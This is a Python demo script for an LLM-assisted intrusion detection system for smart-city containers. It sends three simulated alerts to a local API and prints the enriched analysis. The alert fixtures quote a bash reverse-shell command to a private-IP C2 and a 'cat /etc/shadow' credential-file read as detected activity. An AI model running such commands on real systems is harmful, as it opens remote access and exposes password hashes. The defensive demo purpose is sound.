#!/usr/bin/env python3
"""
Smart City IDS — Live End-to-End Pipeline Demo

Sends 3 realistic security alerts through the full pipeline and displays
the complete LLM analysis journey for each:
  Ingestion → LLM Analysis → Summary → Reasoning → Business Impact
  → Recommendations → Automated K8s Actions

This demonstrates the core innovation: LLM-driven security analysis
that transforms raw alerts into analyst-ready intelligence,
reducing alert fatigue for security teams.
"""
import requests, json, textwrap, time

IDS = "http://localhost:30800"

# ANSI colors
R="\033[0;31m"; G="\033[0;32m"; Y="\033[0;33m"; B="\033[0;34m"
M="\033[0;35m"; C="\033[0;36m"; W="\033[1;37m"; D="\033[0;90m"; N="\033[0m"

def sep():
    print(f"{D}{'─'*78}{N}")

def wrap(text, indent=5):
    for line in textwrap.wrap(str(text), 72):
        print(f"{'':>{indent}}{line}")

def show_alert(num, title, payload):
    print(f"\n{W}▶ ALERT {num}: {title}{N}")
    sep()
    print()

    src = payload.get("source", "?")
    rule = payload.get("rule", "?")
    container = payload.get("output_fields", {}).get("container.name", "?")

    print(f"  {B}① INGESTION{N}")
    print(f"     Source:     {C}{src}{N}")
    print(f"     Rule:       {W}{rule}{N}")
    print(f"     Container:  {container}")
    print(f"     Raw alert:  {D}{payload['output'][:80]}...{N}")
    print()

    print(f"  {D}   → Sending to IDS API → LLM engine...{N}")
    t0 = time.time()
    r = requests.post(f"{IDS}/api/alerts/internal", json=payload, timeout=30)
    d = r.json()
    elapsed = int((time.time()-t0)*1000)
    a = d.get("analysis", {})

    sev = d.get("severity", "?")
    sev_num = int(sev) if str(sev).isdigit() else 0
    if sev_num >= 8: SC, SL = R, "CRITICAL"
    elif sev_num >= 6: SC, SL = Y, "HIGH"
    elif sev_num >= 4: SC, SL = C, "MEDIUM"
    else: SC, SL = G, "LOW"

    eng = d.get("llm_engine", a.get("analysis_engine", "?"))
    lat = d.get("processing_time_ms", elapsed)

    print()
    print(f"  {M}② LLM ANALYSIS{N}  {D}(engine: {eng}, {lat}ms){N}")
    print(f"     Severity:   {SC}{sev}/10 [{SL}]{N}")
    print(f"     Threat:     {Y}{d.get('threat_type','?')}{N}")
    mitre = a.get("mitre_technique", "")
    if mitre: print(f"     MITRE:      {M}{mitre}{N}")
    conf = a.get("confidence", "")
    if conf: print(f"     Confidence: {conf}")
    print()

    summary = d.get("summary", "")
    print(f"  {W}③ SUMMARY{N}")
    wrap(summary)
    print()

    reasoning = a.get("reasoning", "")
    if reasoning:
        print(f"  {C}④ LLM REASONING{N}  {D}(key innovation — reduces alert fatigue){N}")
        wrap(reasoning)
        print()

    impact = a.get("business_impact", "")
    if impact:
        print(f"  {Y}⑤ BUSINESS IMPACT{N}")
        wrap(impact)
        print()

    recs = a.get("recommendations", d.get("recommendations", []))
    if recs:
        print(f"  {G}⑥ RECOMMENDATIONS{N}")
        for i, rec in enumerate(recs[:5], 1):
            print(f"     {i}. {rec}")
        print()

    actions = d.get("automated_actions", d.get("actions_taken", []))
    if actions:
        print(f"  {R}⑦ AUTOMATED K8s ACTIONS{N}")
        for act in actions[:3]:
            if isinstance(act, str):
                print(f"     ⚡ {act}")
            else:
                print(f"     ⚡ {json.dumps(act)}")
    else:
        print(f"  {D}⑦ AUTOMATED ACTIONS: none (below threshold){N}")

    print()
    print(f"  {G}✓ Full pipeline complete in {lat}ms{N}")
    print()
    sep()
    return d


# ═══════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print()
    print(f"{W}╔═══════════════════════════════════════════════════════════════════════╗{N}")
    print(f"{W}║  Smart City IDS — Live End-to-End Pipeline Demo                     ║{N}")
    print(f"{W}║  Innovation: LLM Security Analysis to Reduce Alert Fatigue          ║{N}")
    print(f"{W}╚═══════════════════════════════════════════════════════════════════════╝{N}")
    print()
    print(f"  How it works:")
    print(f"  {D}Falco/Suricata → Alert JSON → IDS API → LLM Engine → Analysis{N}")
    print(f"  {D}→ Severity + Reasoning + MITRE + Recommendations → K8s Actions{N}")
    print()
    print(f"  The LLM provides {W}contextual reasoning{N}, {W}business impact{N}, and")
    print(f"  {W}actionable recommendations{N} — transforming raw alerts into")
    print(f"  analyst-ready intelligence. This is the core innovation.")
    print()
    sep()

    # Alert 1: CRITICAL — Reverse shell
    show_alert(1, f"{R}CRITICAL — Reverse Shell in IoT Container (Falco){N}", {
        "output": "Shell spawned in container: /bin/bash executed by user root in traffic-camera-north-01. Command: bash -i >& /dev/tcp/10.42.0.50/4444 0>&1. Reverse shell established to external C2 server.",
        "priority": "Critical",
        "rule": "Terminal shell in container",
        "time": "2026-02-13T10:30:00Z",
        "source": "falco",
        "output_fields": {
            "container.name": "traffic-camera-north-01",
            "proc.cmdline": "bash -i >& /dev/tcp/10.42.0.50/4444 0>&1",
            "user.name": "root"
        }
    })

    time.sleep(2)

    # Alert 2: HIGH — Network scan
    show_alert(2, f"{Y}HIGH — Network Reconnaissance Scan (Suricata){N}", {
        "output": "ET SCAN Nmap SYN scan detected from 10.42.0.99 targeting smart-city subnet 10.42.1.0/24. Over 500 ports scanned in 10 seconds. Signature: 2001219",
        "priority": "Error",
        "rule": "Port scan detected",
        "time": "2026-02-13T10:31:00Z",
        "source": "suricata",
        "output_fields": {
            "container.name": "env-sensor-grid-02",
            "src_ip": "10.42.0.99",
            "dest_ip": "10.42.1.0/24"
        }
    })

    time.sleep(2)

    # Alert 3: MEDIUM — Sensitive file read
    show_alert(3, f"{C}MEDIUM — Sensitive File Access in Water Monitor (Falco){N}", {
        "output": "Sensitive file opened for reading: /etc/shadow read by process cat in water-quality-monitor-03. User: www-data (non-root user accessing password file)",
        "priority": "Warning",
        "rule": "Read sensitive file untrusted",
        "time": "2026-02-13T10:32:00Z",
        "source": "falco",
        "output_fields": {
            "container.name": "water-quality-monitor-03",
            "proc.cmdline": "cat /etc/shadow",
            "fd.name": "/etc/shadow",
            "user.name": "www-data"
        }
    })

    print()
    print(f"\n{W}═══ DEMO SUMMARY ═══{N}")
    print(f"  3 alerts processed through the full IDS pipeline:")
    print(f"  • Each alert received {W}LLM-powered contextual reasoning{N}")
    print(f"  • Each received {W}MITRE ATT&CK mapping{N}, {W}business impact{N}, and {W}recommendations{N}")
    print(f"  • High-severity alerts triggered {W}automated Kubernetes actions{N}")
    print()
    print(f"  {G}This is how LLM-driven analysis reduces alert fatigue:{N}")
    print(f"  Instead of raw logs, security analysts get enriched, actionable intelligence.")
    print()
